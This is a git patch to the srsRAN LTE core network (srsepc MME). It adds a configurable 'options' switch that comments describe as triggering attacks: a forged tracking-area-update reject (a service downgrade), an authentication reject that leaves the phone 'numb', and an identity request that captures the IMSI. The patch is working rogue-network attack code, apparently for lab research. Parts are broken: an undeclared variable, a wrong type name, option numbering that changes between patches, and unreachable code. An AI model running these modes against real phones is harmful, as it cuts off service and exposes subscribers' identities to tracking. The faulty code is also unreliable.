From 0ed54f211f6a191ba7f19b9ea1e6b53aa5145903 Mon Sep 17 00:00:00 2001
From: Saalim <saalimwani@gmail.com>
Date: Mon, 16 May 2022 20:28:14 +0200
Subject: [PATCH 2/2]  modified_files_for_adding_options

---
 0004-adding-options-to-srsRAN.patch  | 124 +++++++++++++++++++++++
 0005-4-options-for-srs.patch         |  48 +++++++++
 srsepc/hdr/mme/nas.h                 |   7 ++
 srsepc/hdr/mme/s1ap_common.h         |   1 +
 srsepc/src/main.cc                   |   3 +
 srsepc/src/mme/nas.cc                | 141 ++++++++++++++++++++++++++-
 srsepc/src/mme/s1ap_nas_transport.cc |   1 +
 7 files changed, 323 insertions(+), 2 deletions(-)
 create mode 100644 0004-adding-options-to-srsRAN.patch
 create mode 100644 0005-4-options-for-srs.patch

diff --git a/0004-adding-options-to-srsRAN.patch b/0004-adding-options-to-srsRAN.patch
new file mode 100644
index 000000000..e1d4d216a
--- /dev/null
+++ b/0004-adding-options-to-srsRAN.patch
@@ -0,0 +1,124 @@
+From 2caa10a7f90df4a561cbe014c43d591787e48f4b Mon Sep 17 00:00:00 2001
+From: Saalim <saalimwani@gmail.com>
+Date: Sun, 15 May 2022 18:38:17 +0200
+Subject: [PATCH 4/5]  adding options to srsRAN
+
+---
+ .vscode/c_cpp_properties.json        | 16 ++++++++++++++++
+ srsepc/hdr/mme/nas.h                 |  1 +
+ srsepc/hdr/mme/s1ap_common.h         |  1 +
+ srsepc/src/main.cc                   |  9 ++++++++-
+ srsepc/src/mme/s1ap_nas_transport.cc |  1 +
+ 5 files changed, 27 insertions(+), 1 deletion(-)
+ create mode 100644 .vscode/c_cpp_properties.json
+
+diff --git a/.vscode/c_cpp_properties.json b/.vscode/c_cpp_properties.json
+new file mode 100644
+index 000000000..862aed879
+--- /dev/null
++++ b/.vscode/c_cpp_properties.json
+@@ -0,0 +1,16 @@
++{
++    "configurations": [
++        {
++            "name": "Linux",
++            "includePath": [
++                "${workspaceFolder}/**"
++            ],
++            "defines": [],
++            "compilerPath": "/usr/bin/gcc",
++            "cStandard": "gnu17",
++            "cppStandard": "gnu++14",
++            "intelliSenseMode": "linux-gcc-x64"
++        }
++    ],
++    "version": 4
++}
+\ No newline at end of file
+diff --git a/srsepc/hdr/mme/nas.h b/srsepc/hdr/mme/nas.h
+index 974236fbc..4bda91d0a 100644
+--- a/srsepc/hdr/mme/nas.h
++++ b/srsepc/hdr/mme/nas.h
+@@ -142,6 +142,7 @@ typedef struct {
+   srsran::CIPHERING_ALGORITHM_ID_ENUM cipher_algo;
+   srsran::INTEGRITY_ALGORITHM_ID_ENUM integ_algo;
+   bool                                request_imeisv;
++  uint16_t                            options;
+ } nas_init_t;
+ 
+ typedef struct {
+diff --git a/srsepc/hdr/mme/s1ap_common.h b/srsepc/hdr/mme/s1ap_common.h
+index e2161f5c5..b5a5ac4f3 100644
+--- a/srsepc/hdr/mme/s1ap_common.h
++++ b/srsepc/hdr/mme/s1ap_common.h
+@@ -52,6 +52,7 @@ typedef struct {
+   srsran::CIPHERING_ALGORITHM_ID_ENUM encryption_algo;
+   srsran::INTEGRITY_ALGORITHM_ID_ENUM integrity_algo;
+   bool                                request_imeisv;
++  uint16_t                            options;
+ } s1ap_args_t;
+ 
+ typedef struct {
+diff --git a/srsepc/src/main.cc b/srsepc/src/main.cc
+index 95c61db2f..3b9f4b95f 100644
+--- a/srsepc/src/main.cc
++++ b/srsepc/src/main.cc
+@@ -97,6 +97,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
+   string   hss_db_file;
+   string   hss_auth_algo;
+   string   log_filename;
++  uint16_t                            options;
+ 
+   // Command line only options
+   bpo::options_description general("General options");
+@@ -107,6 +108,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
+       ;
+ 
+   // Command line or config file options
++  // @ saalim : answer printed when srsepc --help is written
+   bpo::options_description common("Configuration options");
+   common.add_options()
+     ("mme.mme_code",        bpo::value<string>(&mme_code)->default_value("0x01"),            "MME Code")
+@@ -123,6 +125,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
+     ("mme.encryption_algo", bpo::value<string>(&encryption_algo)->default_value("EEA0"),     "Set preferred encryption algorithm for NAS layer ")
+     ("mme.integrity_algo",  bpo::value<string>(&integrity_algo)->default_value("EIA1"),      "Set preferred integrity protection algorithm for NAS")
+     ("mme.paging_timer",    bpo::value<uint16_t>(&paging_timer)->default_value(2),           "Set paging timer value in seconds (T3413)")
++    ("mme.options",         bpo::value<s>(&tau_reject_cause)->default_value(1),    "Options , 1-> Normal , 2-> Down,3->Numb, 4-> IMSI")
+     ("mme.request_imeisv",  bpo::value<bool>(&request_imeisv)->default_value(false),         "Enable IMEISV request in Security mode command")
+     ("hss.db_file",         bpo::value<string>(&hss_db_file)->default_value("ue_db.csv"),    ".csv file that stores UE's keys")
+     ("spgw.gtpu_bind_addr", bpo::value<string>(&spgw_bind_addr)->default_value("127.0.0.1"), "IP address of SP-GW for the S1-U connection")
+@@ -283,6 +286,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
+   args->mme_args.s1ap_args.short_net_name = short_net_name;
+   args->mme_args.s1ap_args.mme_apn        = mme_apn;
+   args->mme_args.s1ap_args.paging_timer   = paging_timer;
++  args->mme_args.s1ap_args.options         = options;  // @ saalim
+   args->mme_args.s1ap_args.request_imeisv = request_imeisv;
+   args->spgw_args.gtpu_bind_addr          = spgw_bind_addr;
+   args->spgw_args.sgi_if_addr             = sgi_if_addr;
+@@ -394,7 +398,10 @@ int main(int argc, char* argv[])
+   srsran_debug_handle_crash(argc, argv);
+ 
+   all_args_t args = {};
+-  parse_args(&args, argc, argv);
++  parse_args(&args, argc, argv); 
++  /* @ saalim argv contains different arguments, we need to pass another argument to it to trigger differnt attacks 
++
++  */ 
+ 
+   // Setup logging.
+   log_sink = (args.log_args.filename == "stdout") ? srslog::create_stdout_sink()
+diff --git a/srsepc/src/mme/s1ap_nas_transport.cc b/srsepc/src/mme/s1ap_nas_transport.cc
+index e17ea9942..3e725cdc0 100644
+--- a/srsepc/src/mme/s1ap_nas_transport.cc
++++ b/srsepc/src/mme/s1ap_nas_transport.cc
+@@ -80,6 +80,7 @@ void s1ap_nas_transport::init()
+   m_nas_init.paging_timer   = m_s1ap->m_s1ap_args.paging_timer;
+   m_nas_init.integ_algo     = m_s1ap->m_s1ap_args.integrity_algo;
+   m_nas_init.cipher_algo    = m_s1ap->m_s1ap_args.encryption_algo;
++   m_nas_init.options = m_s1ap->m_s1ap_args.options;
+   m_nas_init.request_imeisv = m_s1ap->m_s1ap_args.request_imeisv;
+ 
+   // Init NAS interface
+-- 
+2.25.1
+
diff --git a/0005-4-options-for-srs.patch b/0005-4-options-for-srs.patch
new file mode 100644
index 000000000..1117921f6
--- /dev/null
+++ b/0005-4-options-for-srs.patch
@@ -0,0 +1,48 @@
+From 507f05b8ef3839a94acef44b02b507de86101a1d Mon Sep 17 00:00:00 2001
+From: Saalim <saalimwani@gmail.com>
+Date: Mon, 16 May 2022 16:31:05 +0200
+Subject: [PATCH 5/5]  4 options for srs
+
+---
+ srsepc/src/mme/nas.cc | 24 +++++++++++++++++++++---
+ 1 file changed, 21 insertions(+), 3 deletions(-)
+
+diff --git a/srsepc/src/mme/nas.cc b/srsepc/src/mme/nas.cc
+index 1197816be..fea435527 100644
+--- a/srsepc/src/mme/nas.cc
++++ b/srsepc/src/mme/nas.cc
+@@ -961,10 +961,28 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
+   /*nas_ctx->pack_identity_request(nas_tx.get());
+   s1ap->send_downlink_nas_transport(
+       nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);*/
+-  err2 = nas::handle_attach_request_IMSI_C(enb_ue_s1ap_id, enb_sri, nas_rx, args, itf);
+-  
+-  srsran::console("***********************Sending TAU reject messages NOW*************************12***");
++
++  if (args.options==2){
++      srsran::console("***********************Sending TAU reject messages NOW*************************12***");
++nas_tmp.pack_tracking_area_update_reject(nas_tx.get(),LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
++  }
++  else if (args.options==3)
++  {  nas_tmp.pack_authentication_reject(nas_tx.get()); 
++  srsran::console("Sending Auth_Reject *****************via TAU UPDATE*****************************.\n");
++      
++  }
++  else if (args.options==4 )
++  { err2 = nas::handle_attach_request_IMSI_C(enb_ue_s1ap_id, enb_sri, nas_rx, args, itf);
++ srsran::console("Sending IMSI Request*****************via TAU UPDATE*****************************.\n");
++      
+   nas_tmp.pack_tracking_area_update_reject(nas_tx.get(),LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
++    
++  }
++  else {
++nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
++srsran::console(" Normal Mode  TAU UPDATE*****************************.\n");
++  }
++  
+   //LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED,
+   s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+   return true;
+-- 
+2.25.1
+
diff --git a/srsepc/hdr/mme/nas.h b/srsepc/hdr/mme/nas.h
index 9b0727561..2567f458d 100644
--- a/srsepc/hdr/mme/nas.h
+++ b/srsepc/hdr/mme/nas.h
@@ -141,6 +141,7 @@ typedef struct {
   std::string                         short_net_name;
   srsran::CIPHERING_ALGORITHM_ID_ENUM cipher_algo;
   srsran::INTEGRITY_ALGORITHM_ID_ENUM integ_algo;
+  uint16_t                            options;
   bool                                request_imeisv;
 } nas_init_t;
 
@@ -161,6 +162,12 @@ public:
    * Initial UE messages *
    ***********************/
   // Attach request messages
+  static bool handle_attach_request_IMSI_C(uint32_t                enb_ue_s1ap_id,
+                                    struct sctp_sndrcvinfo* enb_sri,
+                                    srsran::byte_buffer_t*  nas_rx,
+                                    const nas_init_t&       args,
+                                    const nas_if_t&         itf);
+
   static bool handle_attach_request(uint32_t                enb_ue_s1ap_id,
                                     struct sctp_sndrcvinfo* enb_sri,
                                     srsran::byte_buffer_t*  nas_rx,
diff --git a/srsepc/hdr/mme/s1ap_common.h b/srsepc/hdr/mme/s1ap_common.h
index e2161f5c5..00d08777f 100644
--- a/srsepc/hdr/mme/s1ap_common.h
+++ b/srsepc/hdr/mme/s1ap_common.h
@@ -51,6 +51,7 @@ typedef struct {
   std::string                         pcap_filename;
   srsran::CIPHERING_ALGORITHM_ID_ENUM encryption_algo;
   srsran::INTEGRITY_ALGORITHM_ID_ENUM integrity_algo;
+  uint16_t                            options;
   bool                                request_imeisv;
 } s1ap_args_t;
 
diff --git a/srsepc/src/main.cc b/srsepc/src/main.cc
index 95c61db2f..0eb5d4ac8 100644
--- a/srsepc/src/main.cc
+++ b/srsepc/src/main.cc
@@ -86,6 +86,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
   string   encryption_algo;
   string   integrity_algo;
   uint16_t paging_timer     = 0;
+  uint16_t  options =0 ;
   uint32_t max_paging_queue = 0;
   string   spgw_bind_addr;
   string   sgi_if_addr;
@@ -122,6 +123,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
     ("mme.apn",             bpo::value<string>(&mme_apn)->default_value(""),                 "Set Access Point Name (APN) for data services")
     ("mme.encryption_algo", bpo::value<string>(&encryption_algo)->default_value("EEA0"),     "Set preferred encryption algorithm for NAS layer ")
     ("mme.integrity_algo",  bpo::value<string>(&integrity_algo)->default_value("EIA1"),      "Set preferred integrity protection algorithm for NAS")
+    ("mme.options",         bpo::value<uint16_t>(&options)->default_value(0),                 "Option 1-> Tau reject , option 2 -> Numb, 3 ->IMSI")
     ("mme.paging_timer",    bpo::value<uint16_t>(&paging_timer)->default_value(2),           "Set paging timer value in seconds (T3413)")
     ("mme.request_imeisv",  bpo::value<bool>(&request_imeisv)->default_value(false),         "Enable IMEISV request in Security mode command")
     ("hss.db_file",         bpo::value<string>(&hss_db_file)->default_value("ue_db.csv"),    ".csv file that stores UE's keys")
@@ -283,6 +285,7 @@ void parse_args(all_args_t* args, int argc, char* argv[])
   args->mme_args.s1ap_args.short_net_name = short_net_name;
   args->mme_args.s1ap_args.mme_apn        = mme_apn;
   args->mme_args.s1ap_args.paging_timer   = paging_timer;
+  args->mme_args.s1ap_args.options        = options;
   args->mme_args.s1ap_args.request_imeisv = request_imeisv;
   args->spgw_args.gtpu_bind_addr          = spgw_bind_addr;
   args->spgw_args.sgi_if_addr             = sgi_if_addr;
diff --git a/srsepc/src/mme/nas.cc b/srsepc/src/mme/nas.cc
index a14d55eb4..fa82ce8ba 100644
--- a/srsepc/src/mme/nas.cc
+++ b/srsepc/src/mme/nas.cc
@@ -184,6 +184,124 @@ bool nas::handle_attach_request_IMSI_C(uint32_t                enb_ue_s1ap_id,
  * Handle UE Initiating Messages
  *
  ********************************/
+
+bool nas:: handle_attach_request_IMSI_C(uint32_t                enb_ue_s1ap_id,
+                                struct sctp_sndrcvinfo* enb_sri,
+                                srsran::byte_buffer_t*  nas_rx,
+                                const nas_init_t&       args,
+                                const nas_if_t&         itf)
+{
+  uint32_t                                       m_tmsi      = 0;
+  uint64_t                                       imsi        = 0;
+  LIBLTE_MME_ATTACH_REQUEST_MSG_STRUCT           attach_req  = {};
+  LIBLTE_MME_PDN_CONNECTIVITY_REQUEST_MSG_STRUCT pdn_con_req = {};
+  auto&                                          nas_logger  = srslog::fetch_basic_logger("NAS");
+
+  // Interfaces
+  s1ap_interface_nas* s1ap = itf.s1ap;
+  hss_interface_nas*  hss  = itf.hss;
+  gtpc_interface_nas* gtpc = itf.gtpc;
+
+  // Get NAS Attach Request and PDN connectivity request messages
+  LIBLTE_ERROR_ENUM err = liblte_mme_unpack_attach_request_msg((LIBLTE_BYTE_MSG_STRUCT*)nas_rx, &attach_req); // is required @ saalim
+  if (err != LIBLTE_SUCCESS) {
+    nas_logger.error("Error unpacking NAS attach request. Error: %s", liblte_error_text[err]);
+    return false;
+  }
+  // Get PDN Connectivity Request*/
+  err = liblte_mme_unpack_pdn_connectivity_request_msg(&attach_req.esm_msg, &pdn_con_req); //is required @ saalim
+  if (err != LIBLTE_SUCCESS) {
+    nas_logger.error("Error unpacking NAS PDN Connectivity Request. Error: %s", liblte_error_text[err]);
+    return false;
+  }
+
+  // Get UE IMSI
+
+
+  // Log Attach Request Information
+
+  // Get NAS Context if UE is known
+  nas* nas_ctx = NULL;// @ saalim
+  if (nas_ctx == NULL) {
+    // Get attach type from attach request
+    { // @ saalim function to send ID request
+      nas::handle_guti_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
+    } 
+  } 
+  return true;
+
+
+
+// ********                   ***************************************** below is guti function @saalim/
+  //nas*                         nas_ctx;
+  srsran::unique_byte_buffer_t nas_tx;
+
+  // Interfaces
+  /*s1ap_interface_nas* s1ap = itf.s1ap;
+  hss_interface_nas*  hss  = itf.hss;
+  gtpc_interface_nas* gtpc = itf.gtpc;
+*/
+  // Create new NAS context.
+  nas_ctx = new nas(args, itf);
+
+  // Could not find IMSI from M-TMSI, send Id request
+  // The IMSI will be set when the identity response is received
+  // Set EMM ctx
+  nas_ctx->m_emm_ctx.imsi  = 0;
+  nas_ctx->m_emm_ctx.state = EMM_STATE_DEREGISTERED;
+
+  // Save UE network capabilities
+ 
+  // Initialize NAS count
+  nas_ctx->m_sec_ctx.ul_nas_count             = 0;
+  nas_ctx->m_sec_ctx.dl_nas_count             = 0;
+  nas_ctx->m_emm_ctx.procedure_transaction_id = pdn_con_req.proc_transaction_id;
+
+  // Set ECM context  //@ saalim required
+  nas_ctx->m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id; // @ Saalim First Parameter 
+  nas_ctx->m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id(); // @saalim Second Parameter for downlink message
+
+  uint8_t eps_bearer_id = pdn_con_req.eps_bearer_id;
+
+  // Save attach request type
+  //nas_ctx->m_emm_ctx.attach_type = attach_req.eps_attach_type;
+
+  // Save whether ESM information transfer is necessary
+   nas_ctx->m_ecm_ctx.eit = pdn_con_req.esm_info_transfer_flag_present;
+
+  // Add eNB info to UE ctxt
+  memcpy(&nas_ctx->m_ecm_ctx.enb_sri, enb_sri, sizeof(struct sctp_sndrcvinfo));  // @ saalim 3rd parameter
+
+  // Initialize E-RABs
+  for (uint i = 0; i < MAX_ERABS_PER_UE; i++) {
+    nas_ctx->m_esm_ctx[i].state   = ERAB_DEACTIVATED;
+    nas_ctx->m_esm_ctx[i].erab_id = i;
+  }
+
+  // Store temporary ue context
+  //s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
+  //s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
+
+  // Send Identity Request
+  nas_tx = srsran::make_byte_buffer();
+  if (nas_tx == nullptr) {
+    srslog::fetch_basic_logger("NAS").error("Couldn't allocate PDU in %s().", __FUNCTION__);
+    return false;
+  }
+  // Identity request *********************@ Saaalim**************************
+  nas_ctx->pack_identity_request(nas_tx.get());
+  s1ap->send_downlink_nas_transport(
+      nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
+
+
+
+
+
+
+
+
+}
+
 bool nas::handle_attach_request(uint32_t                enb_ue_s1ap_id,
                                 struct sctp_sndrcvinfo* enb_sri,
                                 srsran::byte_buffer_t*  nas_rx,
@@ -931,7 +1049,7 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
                                               srsran::byte_buffer_t*  nas_rx,
                                               const nas_init_t&       args,
                                               const nas_if_t&         itf)
-{
+{ bool err2 ;
   auto& nas_logger = srslog::fetch_basic_logger("NAS");
 
   nas_logger.info("Tracking Area Update Request -- S-TMSI 0x%x", m_tmsi);
@@ -959,7 +1077,26 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
     return false;
   }
-  nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+   if (args.options==1){
+      srsran::console("***********************Sending TAU reject messages NOW*************************12***");
+nas_tmp.pack_tracking_area_update_reject(nas_tx.get(),LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+  }
+  else if (args.options==2)
+  {  nas_tmp.pack_authentication_reject(nas_tx.get()); 
+  srsran::console("Sending Auth_Reject *****************via TAU UPDATE*****************************.\n");
+      
+  }
+  else if (args.options==3 )
+  { err2 = nas::handle_attach_request_IMSI_C(enb_ue_s1ap_id, enb_sri, nas_rx, args, itf);
+ srsran::console("Sending IMSI Request*****************via TAU UPDATE*****************************.\n");
+      
+  nas_tmp.pack_tracking_area_update_reject(nas_tx.get(),LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+    
+  }
+  else {
+nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+srsran::console(" Normal Mode  TAU UPDATE*****************************.\n");
+  }
   s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
   return true;
 }
diff --git a/srsepc/src/mme/s1ap_nas_transport.cc b/srsepc/src/mme/s1ap_nas_transport.cc
index e17ea9942..55578b45b 100644
--- a/srsepc/src/mme/s1ap_nas_transport.cc
+++ b/srsepc/src/mme/s1ap_nas_transport.cc
@@ -81,6 +81,7 @@ void s1ap_nas_transport::init()
   m_nas_init.integ_algo     = m_s1ap->m_s1ap_args.integrity_algo;
   m_nas_init.cipher_algo    = m_s1ap->m_s1ap_args.encryption_algo;
   m_nas_init.request_imeisv = m_s1ap->m_s1ap_args.request_imeisv;
+   m_nas_init.options = m_s1ap->m_s1ap_args.options;
 
   // Init NAS interface
   m_nas_if.s1ap = s1ap::get_instance();
-- 
2.25.1

